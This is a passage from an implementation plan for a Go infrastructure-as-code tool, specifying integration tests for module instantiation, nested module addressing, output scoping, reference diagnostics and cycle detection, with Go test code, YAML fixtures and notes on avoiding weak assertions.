   know whether the two are the same resource. Two genuinely unrelated `db` resources
   in different modules get a note that costs them one line of reading; a moved
   database gets a warning that saves it.

### Files

| Action | Path |
|--------|------|
| create | `tests/integration/m5_modules_test.go` |
| modify | `internal/planner/render.go` |
| modify | `internal/planner/render_test.go` |
| modify | `CLAUDE.md` |


Reuse `project`, `run`, `requireContains`, `result.combined` (`helpers_test.go`),
`writeIn` (`m4_invariants_test.go`), `projectWithFiles` (`m4_variables_test.go`) and
`attrLine` (`m4_test.go`). They are all in package `integration`. Do not write second
copies.

### Interfaces

**Consumes:** the built `cmd/infrata` binary and, for the renderer step,
`planner.Plan`, `planner.Operation`, `planner.OpDestroy`, `planner.OpCreate`,
`address.Address` — all existing.

**Produces:** no exported Go API. It produces the Definition of Done, and
`renderMoveCandidates` / the note line in `internal/planner/render.go`.

### The traps these assertions must not fall into

Every one of these has fired in this repo:

- **A substring that appears anyway.** An M4 integration test asserted the output
  contained `"10"` after `--var replicas=10`, in a fixture whose `cidr` was
  `10.0.0.0/16`. It passed with the feature entirely disabled. Every asserted string
  below was checked against its own fixture; check yours again if you change one.
  The module fixtures here use sizes 7, 20 and 30 precisely because the fake
  provider's own defaults are 10 and 100 and the CIDRs contain neither.
- **Exit status instead of content.** `plan` exits 2 with changes, 0 clean, 1 on
  error. A test asserting `!= 0` for a fresh plan passes forever. Every assertion
  below names the exact code.
- **A fixture already in its expected order** passes against code that does no
  ordering. 10.7 runs the same plan ten times rather than reading one and calling it
  sorted.
- **`-count=1` is mandatory.** This package shells out to `go build`.
- **Assert absence as well as presence.** 10.2 and 10.6 do.

### Steps

#### 10.1 Two small helpers

Create `tests/integration/m5_modules_test.go` with:

```go
package integration

import (
	"fmt"
	"strings"
	"testing"

	"github.com/infrata/infrata/pkg/address"
)

// lineContaining returns the single output line containing needle. Asserting
// on a whole command's output cannot tell "the cycle diagnostic shows the
// cycle" from "the word appears twice, once in the chain and once in a file
// path". Narrowing to one line can.
func lineContaining(t *testing.T, out, needle string) string {
	t.Helper()
	var found []string
	for _, l := range strings.Split(out, "\n") {
		if strings.Contains(l, needle) {
			found = append(found, l)
		}
	}
	if len(found) != 1 {
		t.Fatalf("want exactly one line containing %q, found %d:\n%s", needle, len(found), out)
	}
	return found[0]
}

// firstDiagnosticLine returns the "Error: <summary>" line a rendered
// diagnostic opens with. Two failures that must be distinct (contract Ruling
// 6) are compared through this rather than through a hard-coded wording, so
// the assertion survives Tasks 4-7 choosing their own words.
func firstDiagnosticLine(t *testing.T, out string) string {
	t.Helper()
	for _, l := range strings.Split(out, "\n") {
		if strings.HasPrefix(l, "Error: ") {
			return l
		}
	}
	t.Fatalf("no diagnostic in:\n%s", out)
	return ""
}

// modHeader renders the plan header for a resource inside a module instance,
// built from pkg/address rather than spelled literally.
//
// The canonical form is module-prefixed at every level —
// module.prod.database, module.prod.module.network.vpc — and Amendment 12a
// settled that it stays so. The reason is worth knowing before anyone
// "simplifies" it: an instance both CONTAINS resources and EXPOSES outputs, so
// `prod.endpoint` (an output reference) and a flat `prod.database` (a contained
// resource's address) would be the same shape with two grammars.
// `state show prod.database` could not be told from an output reference. The
// redundant `module.` is what keeps addresses and references visually apart.
//
// Deriving every header from the same function the renderer uses means these
// tests assert that the plan agrees with pkg/address rather than re-spelling
// the format twelve times. The format itself is pinned ONCE, literally, by
// TestTheCanonicalAddressFormIsWhatThePlanPrints below. Without that one
// literal this helper would be tautological — a renderer that stopped using
// Address.String() would satisfy every call of it.
func modHeader(typ string, path []string, name string) string {
	return typ + "." + address.Address{Module: path, Name: name}.String()
}

// TestTheCanonicalAddressFormIsWhatThePlanPrints is the single literal
// assertion the helper above rests on, and the only place in this file that
// spells the canonical form out. internal/state/golden_test.go:119 pins the
// same form on the state side; this is its plan-output counterpart.
func TestTheCanonicalAddressFormIsWhatThePlanPrints(t *testing.T) {
	dir := projectWithFiles(t, `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  primary:
    type: module.db
    network: ${net.id}
`, map[string]string{"modules/db/module.yml": dbModule})

	r := run(t, dir, "plan", "dev")
	if r.ExitCode != 2 {
		t.Fatalf("plan exit = %d, want 2\n%s", r.ExitCode, r.combined())
	}
	if !strings.Contains(r.Stdout, "test.database.module.primary.store") {
		t.Errorf("the plan does not print the canonical module-prefixed address produced by "+
			"address.Address.String(). A flat `primary.store` would be indistinguishable from a "+
			"reference to an OUTPUT named `store` on the instance (Amendment 12a):\n%s", r.Stdout)
	}
	if got := modHeader("test.database", []string{"primary"}, "store"); !strings.Contains(r.Stdout, got) {
		t.Errorf("the plan header disagrees with address.Address.String(): want a line containing %q\n%s",
			got, r.Stdout)
	}
}

// dbModule is one module source, instantiated by most fixtures below. `size`
// carries a declared default of 7, which is neither of the fake provider's own
// defaults (10 outside production, 100 in it) — so a plan showing 7 proves the
// MODULE default won, and a plan showing 10 proves it did not.
const dbModule = `
inputs:
  network:
    type: string
  size:
    type: integer
    default: 7
resources:
  store:
    type: test.database
    engine: postgres
    network: ${network}
    size: ${size}
outputs:
  endpoint:
    value: ${store.endpoint}
`
```

#### 10.2 Instantiation, addressing, and the module-defaults rung

```go
// TestAModuleIsInstantiatedUnderModuleQualifiedAddresses is M5's headline: two
// instantiations of one module source become two distinct resources, addressed
// by module path, and nothing downstream sees a module (contract Ruling 7).
//
// It also pins contract Ruling 3 in both directions. `primary` passes size
// explicitly; `secondary` does not and takes the module's declared default.
// Those are two different rungs of PLAN.md §7's chain and must not render the
// same: an explicit value the caller wrote is base configuration at the
// caller's level, and only the module's own `default:` fills ScopeModuleDefault
// — the rung M4 declared and deliberately left empty.
func TestAModuleIsInstantiatedUnderModuleQualifiedAddresses(t *testing.T) {
	dir := projectWithFiles(t, `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  primary:
    type: module.db
    network: ${net.id}
    size: 20
  secondary:
    type: module.db
    network: ${net.id}
`, map[string]string{"modules/db/module.yml": dbModule})

	r := run(t, dir, "plan", "dev")
	if r.ExitCode != 2 {
		t.Fatalf("plan exit = %d, want 2 (changes present)\n%s", r.ExitCode, r.combined())
	}

	// Three resources, not two: one module source instantiated twice is two
	// resources. An implementation that keyed instantiations by source rather
	// than by name would produce two.
	requireContains(t, r.Stdout, "3 to create")

	primary := attrLine(t, r.Stdout, modHeader("test.database", []string{"primary"}, "store"), "size")
	if !strings.HasPrefix(primary, "size: 20") {
		t.Errorf("primary size line = %q, want the caller's explicit 20", primary)
	}
	if strings.Contains(primary, "module default") {
		t.Errorf("primary size line = %q — a value the CALLER wrote is base configuration at the caller's "+
			"level, not a module default; putting it on that rung would place an explicit value below an "+
			"environment override and invert `explicit config always wins`", primary)
	}

	secondary := attrLine(t, r.Stdout, modHeader("test.database", []string{"secondary"}, "store"), "size")
	if !strings.HasPrefix(secondary, "size: 7 [") {
		t.Errorf("secondary size line = %q, want `size: 7 [...]` — the module's declared default, not the "+
			"provider's 10", secondary)
	}
	if !strings.Contains(secondary, "from module default") {
		t.Errorf("secondary size line = %q does not name the module-defaults rung; PLAN.md §7 declares it "+
			"and M4 left it empty for this milestone", secondary)
	}

	// Absence. A flat address set means nothing renders the module's own
	// internal name, and neither instantiation's value may appear on the
	// other's line.
	if n := strings.Count(r.Stdout, "test.database."+address.Address{Name: "store"}.String()); n != 0 {
		t.Errorf("an unqualified `test.database.store` appears %d times — after stage 5 every address "+
			"carries its module path:\n%s", n, r.Stdout)
	}
	for _, text := range []string{"size: 20", "size: 7"} {
		if n := strings.Count(r.Stdout, text); n != 1 {
			t.Errorf("%q appears %d times, want 1 — one instantiation's input leaked into the other:\n%s",
				text, n, r.Stdout)
		}
	}
	if strings.Contains(r.Stdout, "size: 10") {
		t.Errorf("the provider default reached a resource whose size was supplied:\n%s", r.Stdout)
	}
}
```

**Check before running:** `attrLine` matches an operation header by suffix, and the
renderer's header is `op.Type + "." + op.Address.String()` — so
`test.database.module.primary.store`. Confirm with
`grep -n "renderOperationLines" -A 6 internal/planner/render.go` rather than trusting
this paragraph.

#### 10.2a Modules nest

```go
// TestAModuleInstantiatesAModule is the case a one-level fixture cannot see.
// Spec §7.2 BOUNDS recursion at 32 rather than forbidding it, so a module file
// carries its own `modules:` block and an address grows one segment per level:
// module.platform.module.storage.store. Every part of the engine that handles a
// module path — Address.String, the sort that makes invariant 6 hold, the
// module-qualified header the renderer prints, Origin.Module in a diagnostic —
// is a loop over that path, and a loop is exactly what a single-element fixture
// cannot distinguish from a hard-coded first element.
//
// The inner module's output travels out through the outer module's output,
// which is the second thing one level cannot test: an output whose value reads
// another module's output rather than a resource's attribute.
func TestAModuleInstantiatesAModule(t *testing.T) {
	dir := projectWithFiles(t, `
project: myapp
modules:
  - ./modules/platform
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  platform:
    type: module.platform
    network: ${net.id}
  app:
    type: test.application
    image: nginx:1.27
    database_url: ${platform.dsn}
`, map[string]string{
		"modules/platform/module.yml": `
inputs:
  network:
    type: string
modules:
  - ../db
resources:
  storage:
    type: module.db
    network: ${network}
    size: 30
outputs:
  dsn:
    value: ${storage.endpoint}
`,
		"modules/db/module.yml": dbModule,
	})

	r := run(t, dir, "plan", "dev")
	if r.ExitCode != 2 {
		t.Fatalf("plan exit = %d, want 2\n%s", r.ExitCode, r.combined())
	}

	// Two segments, outermost first, and the module path is a path rather than
	// a single name.
	line := attrLine(t, r.Stdout, modHeader("test.database", []string{"platform", "storage"}, "store"), "size")
	if !strings.HasPrefix(line, "size: 30") {
		t.Errorf("nested store size line = %q, want the 30 the outer module passed in", line)
	}

	// An output that reads another module's output, two levels up.
	dsn := attrLine(t, r.Stdout, "test.application.app", "database_url")
	if dsn != "database_url: (known after apply)" {
		t.Errorf("database_url = %q, want `database_url: (known after apply)` — the inner module's "+
			"computed endpoint, republished by the outer module's output", dsn)
	}

	// Absence: neither a one-level address nor the inner module's own name
	// alone may appear.
	for _, wrong := range []string{
		modHeader("test.database", []string{"storage"}, "store"),
		modHeader("test.database", []string{"platform"}, "store"),
	} {
		if strings.Contains(r.Stdout, wrong) {
			t.Errorf("%s appears in the plan; a nested instantiation carries BOTH levels of its path:\n%s",
				wrong, r.Stdout)
		}
	}
}
```

#### 10.2b Two modules each declaring a `db`

```go
// TestTwoModulesEachDeclaringADbAreDifferentResources is Ruling 1's landmine
// through the binary. Task 1's TestAttributeRefusesAnUnqualifiedReference
// guards the same property at the unit level — it fails if Qualify is skipped,
// or if someone patches around a missing Qualify with a bare-name fallback in
// ResourceScope.Attribute. This is the other end: the user-visible consequence,
// which is that two modules each declaring a `db` get two databases with their
// own engines rather than one shared or one shadowing the other.
//
// The engines differ per instantiation, so a reference resolved by bare name
// shows up as the wrong engine on one side rather than as an error.
func TestTwoModulesEachDeclaringADbAreDifferentResources(t *testing.T) {
	dir := projectWithFiles(t, `
project: myapp
modules:
  - ./modules/app
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  left:
    type: module.app
    network: ${net.id}
    engine: postgres
  right:
    type: module.app
    network: ${net.id}
    engine: mysql
`, map[string]string{"modules/app/module.yml": `
inputs:
  network:
    type: string
  engine:
    type: string
resources:
  db:
    type: test.database
    engine: ${engine}
    network: ${network}
`})

	r := run(t, dir, "plan", "dev")
	if r.ExitCode != 2 {
		t.Fatalf("plan exit = %d, want 2\n%s", r.ExitCode, r.combined())
	}

	// Three resources: the network and one database per instantiation. Two
	// modules collapsing into one would show 2.
	requireContains(t, r.Stdout, "3 to create")

	if line := attrLine(t, r.Stdout, modHeader("test.database", []string{"left"}, "db"), "engine"); line != `engine: "postgres"` {
		t.Errorf("left db engine line = %q, want `engine: \"postgres\"`", line)
	}
	if line := attrLine(t, r.Stdout, modHeader("test.database", []string{"right"}, "db"), "engine"); line != `engine: "mysql"` {
		t.Errorf("right db engine line = %q, want `engine: \"mysql\"`", line)
	}

	// Absence: each engine appears exactly once. One module shadowing the
	// other shows the same engine twice, which is a wrong plan rather than an
	// invalid one and is what makes this worth asserting both ways.
	for _, engine := range []string{`"postgres"`, `"mysql"`} {
		if n := strings.Count(r.Stdout, engine); n != 1 {
			t.Errorf("%s appears %d times, want 1 — one instantiation's `db` resolved to the other's:\n%s",
				engine, n, r.Stdout)
		}
	}
}
```

**Check against the fixture before running:** `postgres` and `mysql` each appear once
in the configuration and nowhere else in the project, and neither is a substring of
`10.0.0.0/16`, `nginx:1.27` or any type name. The `3 to create` assertion is the one
that catches a collapse; the per-engine lines catch a shadow.

#### 10.3 A module output feeding the parent, and it is unknown

```go
// TestAModuleOutputReachesTheCallerAndMayBeUnknown is contract Ruling 5, end
// to end, plus Ruling 4's resolution of `${name.attr}` and Ruling 7's promise
// that stage 8 sees a module's resources.
//
// `${database.endpoint}` names a MODULE, not a resource, and its output reads
// a computed attribute of a resource that does not exist yet. It must stay
// unknown all the way to the page: never an empty string, never a coercion
// failure. And `test.application` declares a Requirement for a test.database
// (providers/test/definitions.go) which only the module supplies — so stage 8
// passing is itself proof that flattening happened before validation.
func TestAModuleOutputReachesTheCallerAndMayBeUnknown(t *testing.T) {
	dir := projectWithFiles(t, `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  database:
    type: module.db
    network: ${net.id}
  app:
    type: test.application
    image: nginx:1.27
    database_url: ${database.endpoint}
`, map[string]string{"modules/db/module.yml": dbModule})

	r := run(t, dir, "plan", "dev")
	if r.ExitCode != 2 {
		t.Fatalf("plan exit = %d, want 2\n%s", r.ExitCode, r.combined())
	}

	line := attrLine(t, r.Stdout, "test.application.app", "database_url")
	if line != "database_url: (known after apply)" {
		t.Errorf("database_url = %q, want `database_url: (known after apply)` — a module output reading a "+
			"computed attribute is unknown at plan time, and an empty string or a coercion error here is "+
			"the failure contract Ruling 5 names", line)
	}

	// Stage 8's requirement check saw the module's database.
	for _, bad := range []string{"requires a database", "No test.database"} {
		if strings.Contains(r.combined(), bad) {
			t.Errorf("stage 8 did not see the module's resource:\n%s", r.combined())
		}
	}

	// And the whole thing converges: apply, then re-plan clean.
	if a := run(t, dir, "apply", "dev", "--auto-approve"); a.ExitCode != 0 {
		t.Fatalf("apply exit = %d, want 0\n%s", a.ExitCode, a.combined())
	}
	again := run(t, dir, "plan", "dev")
	if again.ExitCode != 0 {
		t.Fatalf("re-plan exit = %d, want 0 (acceptance invariant 2)\n%s", again.ExitCode, again.combined())
	}
	requireContains(t, again.Stdout, "No changes.")
}
```

**Check before running:** `requires a database` and `No test.database` are guesses at
stage 8's wording. Read the real strings and use them:

```bash
grep -n "Summary:" -B 3 -A 6 internal/compiler/validate.go
```

Substituting the real text is required; deleting the assertion is not an option.

#### 10.3a A module output's reference names the module's own resource

This is the one assertion in the suite that can tell a correctly scoped module output
from a mis-scoped one, and it exists because writing DoD line 7c made me check whether
anything else could — nothing could.

A module output's `${store.endpoint}` names the module's OWN `store`. Left
scope-relative it binds to a ROOT resource of the same name. Neither `bindAttribute`
nor stage 7 catches that: `internal/compiler/bind.go`'s reference loop checks only
that the named resource EXISTS (`!declared[ref.Resource]`), and no stage validates
that a referenced ATTRIBUTE exists on its target. So the mis-scoped case produces no
diagnostic, and the value is unknown either way, because the compile-time scope
reports every resource attribute as unavailable. Same exit code, same rendered line,
different resource — a silently wrong plan, which is exactly what Ruling 1 exists to
prevent.

What DOES differ is the dependency edge, and the plan renders it on a destroy.

**The two broken worlds fail this test differently, and the step says which.** M4's
rule is that a step states the reason it fails, and this one has two reasons:

- **No qualification at all.** The module's `${store.endpoint}` stays a bare `store`.
  Before the decoy is removed it binds to the decoy; after, `declared` no longer holds
  any bare `store`, so `bindAttribute`'s `!declared[...]` arm fires and the run exits
  **1** with `reference to undeclared resource "store"`. The test fails at the
  `plan exit = %d, want 2` line.
- **Qualification against the WRONG scope** — the caller's rather than the module's
  own, which is the likelier bug once `Qualify` exists. The reference resolves to the
  root decoy, `app` depends on it, and the run exits 2 with the decoy's destroy
  carrying `⚠ This resource has 1 dependent resource.` The test fails at the
  dependents loop.

Both are decisive; they are simply different lines. **Run the unqualified case once
and confirm you get the first one** — if instead you get exit 2 with no dependents
line, the fixture is not exercising what this test claims and the decoy is not being
bound to.

```go
// TestAModuleOutputBindsToTheModulesOwnResource. The root `store` is a decoy:
// a test.network with the same LOGICAL NAME as the module's test.database,
// referenced by nothing. If the module's output `${store.endpoint}` is left
// scope-relative it binds to that decoy, and `app` acquires a dependency on it.
//
// The decoy is then removed from configuration and the resulting destroy is
// inspected. renderDependentsWarning prints "This resource has N dependent
// resources" on a destroy, so a decoy with a dependent says so — and a decoy
// nothing legitimately references must have none.
func TestAModuleOutputBindsToTheModulesOwnResource(t *testing.T) {
	const withDecoy = `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  store:
    type: test.network
    cidr: 10.1.0.0/16
  thedb:
    type: module.db
    network: ${net.id}
  app:
    type: test.application
    image: nginx:1.27
    database_url: ${thedb.endpoint}
`
	dir := projectWithFiles(t, withDecoy, map[string]string{"modules/db/module.yml": dbModule})

	if a := run(t, dir, "apply", "dev", "--auto-approve"); a.ExitCode != 0 {
		t.Fatalf("apply exit = %d, want 0\n%s", a.ExitCode, a.combined())
	}

	// Drop the decoy. Nothing references it, so this must be a lone destroy.
	writeIn(t, dir, "infra.yml", strings.Replace(withDecoy, `  store:
    type: test.network
    cidr: 10.1.0.0/16
`, "", 1))

	r := run(t, dir, "plan", "dev")
	if r.ExitCode != 2 {
		t.Fatalf("plan exit = %d, want 2 — an exit of 1 here is the unqualified case: with the decoy "+
			"gone, a bare `store` matches nothing declared and stage 6 reports an undeclared "+
			"resource\n%s", r.ExitCode, r.combined())
	}
	requireContains(t, r.Stdout, "1 to destroy")
	requireContains(t, r.Stdout, "test.network.store")

	// The assertion. A dependents warning on the decoy means `app` depends on
	// it, which can only happen if the module output's ${store.endpoint}
	// resolved to the root `store` instead of the module's own.
	for _, line := range strings.Split(r.Stdout, "\n") {
		if strings.Contains(line, "dependent") {
			t.Errorf("the decoy has dependents (%q) — a module output's reference escaped its module and "+
				"bound to a root resource of the same name:\n%s", strings.TrimSpace(line), r.Stdout)
		}
	}

	// And the application itself is untouched: its database_url still comes
	// from the module, so removing the decoy changes nothing about it.
	if strings.Contains(r.Stdout, "test.application.app") {
		t.Errorf("removing an unrelated resource changed the application:\n%s", r.Stdout)
	}
}
```

**Check before running:** the decoy is removed by an exact `strings.Replace` of three
lines of the fixture. If the fixture is reindented the replace silently matches
nothing and the test then asserts against an unchanged configuration — which plans
clean and fails on the `1 to destroy` line rather than passing quietly, but confirm
the replacement took effect the first time you run it. `renderDependentsWarning`'s
text is `"This resource has %d dependent %s."`; the loop matches on `dependent` alone
so it survives the singular/plural branch.

#### 10.4 A name that binds to neither a resource nor a module

```go
// TestAReferenceToAMistypedInstanceNamesTheRealOnes.
//
// Ruling 4 got NARROWER under Amendment 8: an instance IS a resource, so
// ${database.endpoint} is an ordinary resource reference whose target happens
// to expand, and there is no module-vs-resource ambiguity left at the caller.
// What survives is the plain undeclared-reference diagnostic — but it now has
// to list module instances among the known resources, because `database` IS
// one, and a user who mistypes an instance name and is shown a list without it
// will conclude the module never loaded.
func TestAReferenceToAMistypedInstanceNamesTheRealOnes(t *testing.T) {
	dir := projectWithFiles(t, `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  database:
    type: module.db
    network: ${net.id}
  app:
    type: test.application
    image: nginx:1.27
    database_url: ${datbase.endpoint}
`, map[string]string{"modules/db/module.yml": dbModule})

	r := run(t, dir, "plan", "dev")
	if r.ExitCode != 1 {
		t.Fatalf("plan exit = %d, want 1 (configuration is not valid)\n%s", r.ExitCode, r.combined())
	}
	out := r.combined()
	requireContains(t, out, "datbase") // the name as typed, not a normalised form
	requireContains(t, out, "database") // the instance it should have named, in the known list
	requireContains(t, out, "net")      // and the provider resource, so the list is not instances-only
}
```

The misspelling is `datbase`, which appears nowhere else in the fixture; `database`
appears as the instance's own name. The second and third assertions together are the
point — `bindAttribute`'s undeclared-reference diagnostic already lists
`sortedNames(declared)`, and after Amendment 8 that list must contain module instances
and provider resources alike, because after expansion they are the same kind of thing.
If the list omits instances, a user who mistypes one is told their module is not there
at all.

#### 10.4a An output's value must be a reference, not a bare dotted string

```go
// TestABareDottedOutputValueIsRefused. PLAN.md §11's own example writes
// `value: service.endpoint` with no ${}, and taking that literally would make
// every dotted scalar ambiguous: `value: production` is a string,
// `value: 1.2.3` is a version, `value: db.example.com` is a hostname, and
// nothing distinguishes any of them from a reference. ${...} is this
// language's only reference syntax. The guard exists so that a user following
// the old example gets an error naming both spellings rather than a module
// that silently publishes the nine characters "store.endpoint".
func TestABareDottedOutputValueIsRefused(t *testing.T) {
	dir := projectWithFiles(t, `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  primary:
    type: module.db
    network: ${net.id}
`, map[string]string{"modules/db/module.yml": `
inputs:
  network:
    type: string
  size:
    type: integer
    default: 7
resources:
  store:
    type: test.database
    engine: postgres
    network: ${network}
    size: ${size}
outputs:
  endpoint:
    value: store.endpoint
`})

	r := run(t, dir, "plan", "dev")
	if r.ExitCode != 1 {
		t.Fatalf("plan exit = %d, want 1 — a bare dotted output value is refused, not published as a "+
			"string\n%s", r.ExitCode, r.combined())
	}
	out := r.combined()
	requireContains(t, out, "${store.endpoint}") // the spelling the user wants
	requireContains(t, out, "$${")               // and the escape, for the case they meant the literal
}
```

The two `requireContains` strings are checked against the fixture: neither `${store.`
nor `$${` appears anywhere in it, so neither can be satisfied by the configuration
being echoed back. The exact wording is Tasks 1-3's; if their action names the two
spellings differently, match theirs — do not delete the assertion that both are named.

#### 10.4b A reference to an output the module does not declare

10.4 covers a name that binds to NEITHER a resource nor an instance. This covers the
half-bound case, which is the more likely typo and the quieter failure: the instance
exists, the output does not.

**Amendment 11's "extends rather than parallels" IS achieved, after a redesign that
made it possible.** A draft of this step reported it unachievable, and that report was
correct against the design of the time: `Qualify` then emitted the
`has no output` diagnostic itself and FOLDED a declared output into an `OpLiteral`, so
no module-output reference survived into `bindAttribute` for a general check to see.

Amendment 13c changed the shape. `Qualify` now returns a single `*value.Expr` and emits
no diagnostics; a reference it cannot resolve is left byte-identical, and
`Scope.OutputNames(name) ([]string, bool)` exposes what a call declares. So both
existence checks now live in one `switch` in `bindAttribute` (step 8.10): a declared
resource's attribute against the registry, an undeclared name against `OutputNames`.
The fold survives for outputs that DO exist — which is what keeps Ruling 5 working,
since splicing the output's `*Expr` would lose the Kind — and only the failing case
reaches the check.

That is why this test's implementation is this task's after all, and why the
discrimination below deletes an arm of step 8.10 rather than something in
`internal/modules`.

What makes the module end worth its own test is that omitting the available-names half
is easy and hurts most here: a generic "no such attribute" message has the available
set in hand at the moment it fails, but **a user cannot see a module's outputs from the
calling file**. Naming `endpoint` — the output that does exist — is §44's "what was
expected" and is the assertion to keep when the check generalises.

```go
// TestAReferenceToAnUndeclaredModuleOutputIsReported. The module exists and
// the output does not. Unlike the general referenced-attribute gap, stage 5
// can see this one: it resolves ${module.output} against the module's declared
// outputs, so the lookup that fails is the lookup that reports.
//
// Asserted on `validate` rather than `plan` because it is a configuration
// error and must not require state or a refresh to surface.
func TestAReferenceToAnUndeclaredModuleOutputIsReported(t *testing.T) {
	dir := projectWithFiles(t, `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  thedb:
    type: module.db
    network: ${net.id}
  app:
    type: test.application
    image: nginx:1.27
    database_url: ${thedb.vpc_id}
`, map[string]string{"modules/db/module.yml": dbModule})

	r := run(t, dir, "validate", "dev")
	if r.ExitCode != 1 {
		t.Fatalf("validate exit = %d, want 1 — a reference to an output the module does not declare is "+
			"an error, not an unknown: rendered as `(known after apply)` it promises a value that will "+
			"never arrive\n%s", r.ExitCode, r.combined())
	}
	out := r.combined()
	requireContains(t, out, "vpc_id")   // the output that does not exist
	requireContains(t, out, "thedb")    // the module it was asked of
	requireContains(t, out, "endpoint") // and the one it does declare, per PLAN.md §44
}
```

**Check against the fixture before running:** `vpc_id` appears nowhere else in the
project, and `endpoint` appears only as `dbModule`'s one declared output — so the
third assertion cannot be satisfied by the reference being echoed back. The third is
`PLAN.md` §44's "what was expected": a diagnostic naming the missing output without
listing the available ones tells the user they were wrong and not what to write.

**The discrimination step.** Two deletions, and they prove different things. This step
has been rewritten twice as the design moved; what follows is against Amendment 13c's
shape, so verify `Qualify`'s signature is the single-return one before trusting it:

```bash
grep -n "func (s \*Scope) Qualify" internal/modules/*.go   # returns *value.Expr, no diagnostics
```

1. Delete the `if outputs, isCall := inst.Scope.OutputNames(...)` block from step
   8.10's default arm and re-run this test. **It must fail**, and specifically with the
   unbound-name message misattributing a real module call — which is the failure
   `TestAMisspelledModuleOutputIsDistinguishedFromAnUnboundName` (8.9b) pins at the
   unit level. Restore it.

2. Delete step 8.10's **attribute** arm instead and re-run this test together with
   `TestAReferenceToANonexistentAttributeFailsAtValidate` (10.4c). This test must still
   PASS and 10.4c must FAIL. That is what shows the two arms are independent rather
   than one masking the other; if 10.4c passes, the general check is being served by
   something else and step 8.10 is dead code.

**There is no seam to request here, and an earlier draft of this step asked for one.**
It said `modules.Instance` carries no outputs and that Tasks 4-7 must add a way to
enumerate them. That was wrong on both counts, and asking for it would have been
actively harmful: `modules.Scope.Lookup(name)` already returns a
`Binding{Kind: BindsModule, Outputs: map[string]value.Value}`, so a module call's
outputs are already reachable, and adding a field would have put an instance's outputs
in two places that can disagree — the duplicate-state shape this project keeps paying
for, introduced while closing a gap that existed because something was counted once.

**The accessor, and where it is NOT.** `OutputNames` is on `Scope`, not on `Instance`,
and the distinction is load-bearing rather than stylistic: after expansion no `Instance`
represents a module call at all — its resources are flattened out under
`module.<call>.*` and the call itself survives only as a binding in the ENCLOSING
scope, so a method on `Instance` would have nothing to answer from.

```go
// modules
func (s *Scope) OutputNames(name string) ([]string, bool)  // sorted; false when not a call
```

Call it as `inst.Scope.OutputNames(ref.Target.Name)` — the scope of the instance holding
the REFERENCE, which is the same table `Qualify` consulted, so the two cannot disagree
about what a name means. `false` is the signal to take the unbound-name arm; it is false
both for a plain resource and for a name bound to nothing, and `Scope.Names()` is what
distinguishes those when building the message.

An earlier draft of this step said no such accessor was needed and told the implementer
to refuse one if offered. That was written when `Qualify` still owned the diagnostic;
under Amendment 13c it is wrong, and the instruction is deleted rather than left to
contradict step 8.10.

#### 10.4c The general attribute check, through the binary

Amendment 11's general case, asserted where it actually bit. 10.4b is the module
extension of the same check; this is the check itself, and it runs first for the reason
Amendment 11 gives — build the module case alone and it becomes a module-only copy of
something the compiler should do generally.

```go
// TestAReferenceToANonexistentAttributeFailsAtValidate. The measured failure
// was not "a confusing message" — it was `infrata apply` CREATING REAL
// INFRASTRUCTURE and then failing partway through on a typo that `validate`
// had passed. So the assertions are: validate refuses it, and apply creates
// nothing.
//
// There is deliberately no assertion on `plan` output. A phantom attribute
// renders identically to a legitimate computed reference — `(known after
// apply)`, or `<sensitive>` when the attribute is sensitive, as `password` is
// — so there is nothing in a plan a user or a test could read to tell them
// apart. Asserting on plan text here would be asserting on a string that is
// correct in both worlds.
func TestAReferenceToANonexistentAttributeFailsAtValidate(t *testing.T) {
	dir := project(t, `
project: myapp
resources:
  store:
    type: test.network
    cidr: 10.0.0.0/16
  db:
    type: test.database
    engine: postgres
    network: ${store.id}
    password: ${store.endpoint}
`)

	v := run(t, dir, "validate", "dev")
	if v.ExitCode != 1 {
		t.Fatalf("validate exit = %d, want 1 — test.network has no `endpoint`, and validate is the "+
			"command whose entire job is to catch that before anything is created\n%s",
			v.ExitCode, v.combined())
	}
	out := v.combined()
	requireContains(t, out, "endpoint")
	requireContains(t, out, "test.network") // the cause, which the apply-time message never names
	requireContains(t, out, "cidr")         // what was expected, per §44

	// The regression that matters. Before Amendment 11 this apply created
	// `store` for real and then failed on `db`.
	a := run(t, dir, "apply", "dev", "--auto-approve")
	if a.ExitCode == 0 {
		t.Fatalf("apply succeeded on configuration validate rejects\n%s", a.combined())
	}
	st := run(t, dir, "state", "list", "dev")
	if strings.Contains(st.Stdout, "store") {
		t.Errorf("apply created `store` before failing on the typo — the failure this check exists to "+
			"prevent is real infrastructure existing after a run that should never have started:\n%s",
			st.Stdout)
	}

	// And the symptom message must not be what the user sees.
	if strings.Contains(a.combined(), "still unknown after its dependencies were applied") {
		t.Errorf("apply reported the symptom rather than being refused at compile time:\n%s", a.combined())
	}
}
```

**Check before running:** `state list <environment>` is the subcommand
(`internal/cli/state.go:23`); confirm and match its output shape. If the environment
has no state file at all, `state list` may error rather than print nothing — in that
case assert on its exit code instead, but do NOT drop the assertion: "apply created
nothing" is the whole point of this test.

#### 10.5 Cycles and depth are different failures

```go
// TestAModuleCycleShowsTheCycle is contract Ruling 6. The cycle runs through
// two module LEVELS — root instantiates ping, ping instantiates pong, pong
// instantiates ping — because modules nest (spec §7.2 bounds recursion rather
// than forbidding it) and a module naming itself directly is the easy half. A
// detector that only compares a module against its immediate parent passes the
// self-reference case and hangs here.
//
// Spec §7.4 requires the diagnostic to name the full cycle, not one
// participant — and "shows the cycle" is asserted by requiring the chain line
// to mention `ping` twice,
// because a chain that returns to where it started is what makes it a cycle.
// Narrowing to the one line containing the arrow is what stops the file path
// `modules/ping/module.yml`, which also says "ping", from satisfying it.
func TestAModuleCycleShowsTheCycle(t *testing.T) {
	dir := projectWithFiles(t, `
project: myapp
modules:
  - ./modules/ping
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  first:
    type: module.ping
`, map[string]string{
